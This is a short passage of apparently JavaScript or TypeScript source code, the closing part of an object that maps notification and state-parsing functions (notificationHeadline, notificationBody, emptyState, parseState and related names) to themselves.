    notificationHeadline: notificationHeadline,
    notificationBody: notificationBody,
    emptyInternal: emptyInternal,
    emptyState: emptyState,
    parseInternal: parseInternal,
    parseState: parseState
  }
}
